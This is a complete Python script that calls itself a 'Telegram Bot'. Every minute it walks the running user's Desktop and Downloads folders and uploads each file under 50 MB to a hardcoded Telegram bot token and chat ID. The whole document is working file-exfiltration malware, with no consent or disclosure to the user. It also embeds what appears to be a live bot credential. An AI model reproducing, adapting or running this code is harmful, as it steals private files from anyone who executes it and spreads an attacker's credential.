import os
import requests
import time

BOT_TOKEN = "7985935811:AAGtMDKI2MOKdRlKbmMSDMayVPMr8MObnKk"
CHAT_ID = "2041578952"
SIZE_LIMIT = 50 * 1024 * 1024

TARGET_DIRS = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Downloads")
]

def send_file(file_path):
    try:
        with open(file_path, "rb") as f:
            response = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                data={"chat_id": CHAT_ID},
                files={"document": f},
                timeout=20
            )
        if response.ok:
            print(f"File sent: {file_path}")
        else:
            print(f"Error sending file: {file_path} - {response.status_code}")
    except Exception as e:
        print(f"Error sending file: {file_path} - {e}")

def check_file(file_path):
    try:
        if os.path.getsize(file_path) <= SIZE_LIMIT:
            send_file(file_path)
        else:
            print(f"File size limit exceeded: {file_path}")
    except Exception as e:
        print(f"Error processing file: {file_path} - {e}")

def main():
    while True:
        for target_dir in TARGET_DIRS:
            for root, _, files in os.walk(target_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    check_file(file_path)
        time.sleep(60)

if __name__ == "__main__":
    print("Telegram Bot is running...")
    main()